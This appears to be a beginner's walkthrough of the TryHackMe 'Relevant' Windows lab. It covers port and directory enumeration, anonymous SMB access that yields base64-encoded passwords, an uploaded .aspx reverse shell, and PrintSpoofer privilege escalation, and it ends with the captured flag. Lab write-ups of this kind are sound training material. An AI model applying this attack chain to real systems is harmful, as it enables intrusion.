@@ -1,0 +1,200 @@
+This is the Releveant TryHackMe room writeup.
+
+I won't lie, this took a lot of thought to be able to root this Windows machine, but I'm glad I stuck with it,
+
+
+#########################Enumeration#################################################################
+First, we always have to do basic enumeration.
+I always run Rustscan first, instead of NMAP. 
+Rustscan lets me know right away what ports are open. Then, if I want further enumeration,
+I just define whatever port I need within NMAP. 
+
+Let's get started!
+
+After running this command
+  rustscan -a <ip> -b 65535
+I receive this output
+  PORT      STATE SERVICE       REASON
+  80/tcp    open  http          syn-ack
+  135/tcp   open  msrpc         syn-ack
+  139/tcp   open  netbios-ssn   syn-ack
+  445/tcp   open  microsoft-ds  syn-ack
+  3389/tcp  open  ms-wbt-server syn-ack
+  49663/tcp open  unknown       syn-ack
+  49667/tcp open  unknown       syn-ack
+  9669/tcp open  unknown        syn-ack
+
+After this, I ran a GoBuster scan.
+If you don't know what GoBuster is, it is basically a way to enumerate different directories within a specific target.
+
+I ran this command
+  gobuster dir -u http://10.10.4.90 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,img,py,aspx
+  
+  Let's let this run for a little bit, and see what happens.
+  
+I noticed that SMB shares were open so I ran this command to enumerate them.
+  nmap --script smb-enum-shares.nse -p445 10.10.168.240
+  After this command, I received this output:
+  
+  
+| smb-enum-shares: 
+|   account_used: guest
+|   \\10.10.168.240\ADMIN$: 
+|     Type: STYPE_DISKTREE_HIDDEN
+|     Comment: Remote Admin
+|     Anonymous access: <none>
+|     Current user access: <none>
+|   \\10.10.168.240\C$: 
+|     Type: STYPE_DISKTREE_HIDDEN
+|     Comment: Default share
+|     Anonymous access: <none>
+|     Current user access: <none>
+|   \\10.10.168.240\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: Remote IPC
+|     Anonymous access: <none>
+|     Current user access: READ/WRITE
+|   \\10.10.168.240\nt4wrksv: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Anonymous access: <none>
+|_    Current user access: READ/WRITE
+
+I immediately took notice to the "nt4wrksv" share on the SMB network.
+  I used the command:
+    smbclient //10.10.168.240/nt4wrksv
+This command allowed me to gain anonymous access to the SMB share on the network.
+
+After I gained access to this SMB share, I ran the command:
+  After gaining access, I ran the “dir” command within SMB, and this was the output:
+smb: \> dir
+  .                                   D        0  Thu Jul  1 21:49:54 2021
+  ..                                  D        0  Thu Jul  1 21:49:54 2021
+  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
+
+Interesting, there is a file called "passwords.txt." Let's download this file, and see what it is.
+  To do this, I ran the command:
+    get passwords.txt
+    
+    This command downloaded the file to my local machine
+    
+Now that we have this file downloaded, let's open it up and see what's inside.
+
+After opening the file, this was the output:
+  Encoded Text:
+  Qm9iIC0gIVBAJCRXMHJEITEyMw==
+
+  Decoded Text:
+  Bob - !P@$$W0rD!123
+  
+  Encoded Text:
+  QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk==
+
+  Decoded Text:
+  Bill - Juw4nnaM4n420696969!$$$
+  
+  
+So, you can tell by the two "=" at the end of the text that this is encoded with Base64. You can easily lookup "Base64 Decoder" to decode this text.
+The second encoded text is the same thing. All you have to do is add two "=" to the end of the string.
+
+However, these passwords didn't provide me with much, so I reran my GoBuster scan with a larger wordlist.
+This new scan provided me with a new directory that will look very familiar:
+  /nt4wrksv
+I navigated to <ip>/nt4wrksv
+Nothing really came up.
+#################################INITIAL ACCESS############################################################################################################
+I remembered that I have access to this users SMB share.
+I realized that I should be able to put a file onto this share, and  navigate to it on my browser
+I first tried putting a PHP reverse shell.
+This didn't work. This server doesn't support PHP
+Then, I tried .aspx reverse shell.
+This worked.
+
+I ran this command on the /nt4wrksv SMB share
+  put /shell.aspx
+This shell comes default with Kali.
+All you have to do is define the IP and Listening port on the .aspx reverse shell, and upload it to the SMB share with the above command.
+
+I then navigated to this users address within m browser
+  http://<ip>/nt4wrksv/shell.aspx
+  
+  This allowed me to gain an initial reverse shell.
+    Proof:
+      Proof - running the dir command in C:\Users\:
+
+      dir
+      Volume in drive C has no label.
+      Volume Serial Number is AC3C-5CB5
+
+      Directory of C:\Users
+
+      07/25/2020  02:03 PM    <DIR>          .
+      07/25/2020  02:03 PM    <DIR>          ..
+      07/25/2020  08:05 AM    <DIR>          .NET v4.5
+      07/25/2020  08:05 AM    <DIR>          .NET v4.5 Classic
+      07/25/2020  10:30 AM    <DIR>          Administrator
+      07/25/2020  02:03 PM    <DIR>          Bob
+      07/25/2020  07:58 AM    <DIR>          Public
+  
+  
+  
+ Then, all I needed to do was navigate to Bob's directory with the "cd" command.
+ Here, I was able to see the user.txt - aka flag number 1
+ 
+ Now, my goal is to root this system.
+ After some local enumeration, I discovered this output - I'm not going to give the command, because it was a foundational moment for me once I figured it out.
+  Privilege Name                Description                               State   
+  ============================= ========================================= ========
+  SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+  SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+  SeAuditPrivilege              Generate security audits                  Disabled
+  SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+  SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+  SeCreateGlobalPrivilege       Create global objects                     Enabled 
+  SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+  
+  
+SeImpersonatePrivilege is interesting to me. This is atypical, and worth exploring
+ 
+
+    I was able to escalate privileges with a GitHub script: https://github.com/dievus/printspoofer
+    I uploaded this .exe to the SMB share I had access to.
+    Then, I was able to navigate to this share on the reverse shelled machine I had access to C:\System32\wwwroot\nt***
+    I ran this .exe, and was able to gain Admin privileges.
+    
+Now, my goal is to find root.txt
+  I then navigated to C:\Users\Administrator\Desktop where I found the “root.txt”
+  Output:
+
+  C:\Users\Administrator>cd Desktop
+  cd Desktop
+
+  C:\Users\Administrator\Desktop>dir
+  dir
+  Volume in drive C has no label.
+  Volume Serial Number is AC3C-5CB5
+
+  Directory of C:\Users\Administrator\Desktop
+
+  07/25/2020  08:24 AM    <DIR>          .
+  07/25/2020  08:24 AM    <DIR>          ..
+  07/25/2020  08:25 AM                35 root.txt
+               1 File(s)             35 bytes
+               2 Dir(s)  20,257,091,584 bytes free
+
+  C:\Users\Administrator\Desktop>type root.txt
+  type root.txt
+  THM{1fk5kf469devly1gl320zafgl345pv}
+  C:\Users\Administrator\Desktop>
+  
+  
+ I tried to make this writeup better than the last one. I did this on the day before I wrote this, so I'm not fully confident in the notes. However,
+ I tried my best to add output, etc. I'm still trying to figure out Greenshot or Flameshot
+ I think this should be good enough to be able to work your way through this challenge.
+ 
+ Thank you so much for reading. I'm still very new to cybersecurity, so this may not have been the most efficient way to exploit this machine.
+ I'm just happy I was able to do it lol. 
+ 
+ Anyway. Thank you for viewing. If you wanna talk to this beginner moron pentester hmu on Twitter
+ Twitter: @Jordan72606035
+ Check out my Python scripts to!
